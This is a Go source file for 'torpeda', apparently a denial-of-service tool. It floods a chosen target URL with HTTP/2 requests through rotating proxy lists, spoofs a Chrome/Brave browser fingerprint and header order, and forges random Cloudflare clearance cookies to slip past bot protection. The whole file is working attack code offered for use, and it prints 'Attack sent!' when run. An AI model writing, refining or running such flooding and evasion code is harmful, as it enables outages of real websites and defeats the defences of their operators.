package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	http "github.com/bogdanfinn/fhttp"
	"github.com/bogdanfinn/fhttp/http2"
	"github.com/panjf2000/ants/v2"
	"h12.io/socks"
)

var (
	reqmethod     string
	target        string
	duration      int
	threads       int
	rps           float64
	proxies       = []string{}
	proxyFile     string
	debug         bool
	extra         bool
	closeConn     bool
	test          bool
	redirect      bool
	parsed        bool
	cf            bool
	cookies       = ""
	customCookie  string
	connectionFlow = uint32(15663105)
	statusMap      = make(map[int]int)
	statusMutex    sync.Mutex
)

var (
	pseudoHeaderOrder = []string{":method", ":authority", ":scheme", ":path"}
	settingsFrame = map[http2.SettingID]uint32{
		http2.SettingHeaderTableSize:   65536,
		http2.SettingEnablePush:        0,
		http2.SettingInitialWindowSize: 6291456,
		http2.SettingMaxHeaderListSize: 262144,
	}
	settingsFrameOrder = []http2.SettingID{
		http2.SettingHeaderTableSize,
		http2.SettingEnablePush,
		http2.SettingInitialWindowSize,
		http2.SettingMaxHeaderListSize,
	}
)

func main() {
	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
	if len(os.Args) < 7 {
		fmt.Println(`
		[flooder - golang] torpeda v0.2 // Updated: 29.10.2024
		Developers to method: mitigations aka @rapidreset
		How to use & example:

		go run h2pivo.go <reqmethod> <target> <time> <threads> <ratelimit> <proxyfile>
		go run h2pivo.go GET "https://target.com" 120 16 128 proxy.txt

		Options:
		--debug - 
		--extra - 
		--close - 
		--test - 
		--redirect - 
		--parsed -
		--cf - 
		--cookie <value> - for custom cookie and also cookie support %RAND% ex: --cookie "bypassing=%RAND%"
		--postdata <value> -
		`)
		return
	}

	reqmethod = os.Args[1]
	target = os.Args[2]
	duration, _ = strconv.Atoi(os.Args[3])
	threads, _ = strconv.Atoi(os.Args[4])
	rps, _ = strconv.ParseFloat(os.Args[5], 64)
	proxyFile = os.Args[6]

	if !contains(validMethods, reqmethod) {
		fmt.Println("[#1] Request method can only be GET/HEAD/POST/PUT/DELETE/CONNECT/OPTIONS/TRACE/PATCH")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "https://") && !strings.HasPrefix(target, "http://") {
		fmt.Println("[#2] Target must start with https:// or http://")
		os.Exit(1)
	}

	if duration < 1 || duration > 86400 {
		fmt.Println("[#3] Time must be between 1 and 86400 seconds")
		os.Exit(1)
	}

	if threads < 1 || threads > 512 {
		fmt.Println("[#4] Threads must be between 1 and 512")
		os.Exit(1)
	}

	if rps < 0.1 || rps > 256 {
		fmt.Println("[#5] Ratelimit must be between 0.1 and 256")
		os.Exit(1)
	}

	for i := 0; i < len(os.Args); i++ {
        switch os.Args[i] {
        case "--debug":
            debug = true
        case "--extra":
            extra = true
        case "--test":
            test = true
        case "--close":
            closeConn = true
        case "--redirect":
            redirect = true
        case "--parsed":
            parsed = true
        case "--cookie":
            if i+1 < len(os.Args) {
                customCookie = os.Args[i+1]
            }
        }
    }

	readProxies()

	fmt.Println("Attack sent!")

	if debug {
		go printStatuses()
	}

	p, _ := ants.NewPool(threads)
	defer p.Release()

	for i := 0; i < threads; i++ {
		p.Submit(func() {
			for _, proxy := range proxies {
				go start(proxy)
			}
		})
	}

	time.Sleep(time.Duration(duration) * time.Second)
}


func detectProxyType(proxy string) string {
	if strings.HasPrefix(proxy, "socks5://") {
		return "socks5"
	} else if strings.HasPrefix(proxy, "socks4://") {
		return "socks4"
	} else if strings.HasPrefix(proxy, "https://") {
		return "https"
	} else if strings.HasPrefix(proxy, "http://") {
		return "http"
	}

	if strings.Contains(proxy, ":") {
		return "http"
	}

	return "http"
}

func randstr(length int) string {
	const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	var result strings.Builder
	charactersLength := len(characters)
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < length; i++ {
		randomIndex := rand.Intn(charactersLength)
		result.WriteByte(characters[randomIndex])
	}

	return result.String()
}

func timestampString() string {
	return strconv.FormatInt(time.Now().Unix(), 10)
}

func Cloudflarecookie() string {
	cookieValue := fmt.Sprintf(`cf_clearance=%s.%s-%s-1.2.1.1-%s.%s.%s_%s_%s_%s_%s.%s`,
		randstr(19),
		randstr(23),
		timestampString(),
		randstr(108),
		randstr(21),
		randstr(11),
		randstr(12),
		randstr(201),
		randstr(6),
		randstr(20),
		randstr(20),
	)
	return cookieValue
}

func parseCookies(resp *http.Response) {
	uniqueCookies := make(map[string]string)

	setCookies := resp.Header["Set-Cookie"]
	if len(setCookies) > 0 {
		for _, cookie := range setCookies {
			cookieParts := strings.Split(cookie, ";")[0]
			cookieName := strings.Split(cookieParts, "=")[0]

			if _, exists := uniqueCookies[cookieName]; !exists {
				uniqueCookies[cookieName] = cookieParts
			}
		}

		cookies = ""
		for _, cookieValue := range uniqueCookies {
			if cookies == "" {
				cookies = cookieValue
			} else {
				cookies += "; " + cookieValue
			}
		}

		if debug {
			fmt.Println("Cookies: ", cookies)
		}
	}
}

func randomHeader() http.Header {
	header := http.Header{
		"cache-control": 			 []string{"max-age=0"},
		"sec-ch-ua":                 []string{`"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"`},
		"sec-ch-ua-mobile":          []string{"?0"},
		"sec-ch-ua-platform":        []string{`"Windows"`},
		"upgrade-insecure-requests": []string{"1"},
		"user-agent":                []string{`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`},
		"accept":                    []string{`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`},
		"sec-gpc":                   []string{"1"},
		"accept-language":           []string{"en-US,en;q=0.7"},
		"sec-fetch-site":            []string{"none"},
		"sec-fetch-mode":            []string{"navigate"},
		"sec-fetch-user":            []string{"?1"},
		"sec-fetch-dest":            []string{"document"},
		"accept-encoding":           []string{"gzip, deflate, br, zstd"},
		"priority":                  []string{"u=0, i"},
	}

	if cf {
		cloudflareCookie := Cloudflarecookie()
		header.Set("Cookie", cloudflareCookie)
	}

	if extra {
		randomKey := "1pizdec" + randstr(5)
		header[randomKey] = []string{randstr(6)}
	}

	header[http.HeaderOrderKey] = []string{
		"cache-control",
		"sec-ch-ua",
		"sec-ch-ua-mobile",
		"sec-ch-ua-platform",
		"upgrade-insecure-requests",
		"user-agent",
		"accept",
		"sec-gpc",
		"accept-language",
		"sec-fetch-site",
		"sec-fetch-mode",
		"sec-fetch-user",
		"sec-fetch-dest",
		"accept-encoding",
		"priority",
	}
	return header
}

func readProxies() {
	file, err := os.Open(proxyFile)
	if err != nil {
		log.Fatalf("Failed to open proxy file: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}
	if err := scanner.Err(); err != nil {
		log.Fatalf("Error reading proxy file: %v", err)
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func processCustomCookie(cookie string) string {
	return strings.ReplaceAll(cookie, "%RAND%", randstr(10))
}

func ResponseBody(resp *http.Response) {
	const maxSize = 128 * 1 
	limitedReader := io.LimitReader(resp.Body, maxSize)

	if _, err := io.Copy(ioutil.Discard, limitedReader); err != nil {
		return
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	pageContent := string(bodyBytes)
	fmt.Println(pageContent)
}
func createRatePattern(max int) []int {
	var pattern []int
	for i := 1; i <= max; i++ {
		pattern = append(pattern, i)
	}
	for i := max - 1; i >= 1; i-- {
		pattern = append(pattern, i)
	}
	return pattern
}
func start(proxy string) {
	proxyType := detectProxyType(proxy)

	if proxyType == "http" || proxyType == "https" {
		if !strings.HasPrefix(proxy, "http://") && !strings.HasPrefix(proxy, "https://") {
			proxy = "http://" + proxy
		}
	}

	proxyClean := strings.TrimPrefix(proxy, proxyType+"://")

	var transport *http.Transport

	if proxyType == "socks5" || proxyType == "socks4" {
		dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
		transport = &http.Transport{
			Dial: dialSocksProxy,
		}
	} else if proxyType == "http" || proxyType == "https" {
		proxyURL, err := url.Parse(proxy)
		if err != nil {
			return
		}
		transport = &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		}
	}

	transport.ForceAttemptHTTP2 = true
	transport_http2, err := http2.ConfigureTransports(transport)
	if err != nil {
		return
	}

	transport_http2.Settings = settingsFrame
	transport_http2.SettingsOrder = settingsFrameOrder
	transport_http2.PseudoHeaderOrder = pseudoHeaderOrder
	transport_http2.ConnectionFlow = connectionFlow
	transport.H2transport = transport_http2

	client := &http.Client{
		Timeout: time.Second * 10,
		Transport: transport,
	}

	if redirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			if debug {
				log.Printf("Redirect  %s", req.URL.String())
			}
			return nil
		}
	}

	req, err := http.NewRequest(reqmethod, target, nil)
	if err != nil {
		return
	}
	
	if customCookie != "" {
		processedCookie := processCustomCookie(customCookie)
		req.Header.Set("Cookie", processedCookie)
	}

	req.Header = randomHeader()

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if parsed {
		parseCookies(resp)
	}

	if test {
		ResponseBody(resp)
	}

	ratePattern := createRatePattern(int(rps))
	var wg sync.WaitGroup

	for _, rpsValue := range ratePattern {
		ticker := time.NewTicker(time.Second / time.Duration(rpsValue))
		defer ticker.Stop()

		for i := 0; i < rpsValue; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for range ticker.C {
					resp, err := client.Do(req)
					if err != nil {
						continue
					}
					updateStatusMap(resp.StatusCode)
					resp.Body.Close()
				}
			}()
		}
		time.Sleep(time.Second)
	}
	wg.Wait()
}

func updateStatusMap(statusCode int) {
	statusMutex.Lock()
	defer statusMutex.Unlock()
	statusMap[statusCode]++
}

func printStatuses() {
	for debug {
		time.Sleep(time.Second)
		statusMutex.Lock()
		fmt.Print("\033[H\033[2J") // очистка консоли
		for code, count := range statusMap {
			fmt.Printf("{ %d: %d }\n", code, count)
		}
		statusMap = make(map[int]int) // очистка карты
		statusMutex.Unlock()
	}
}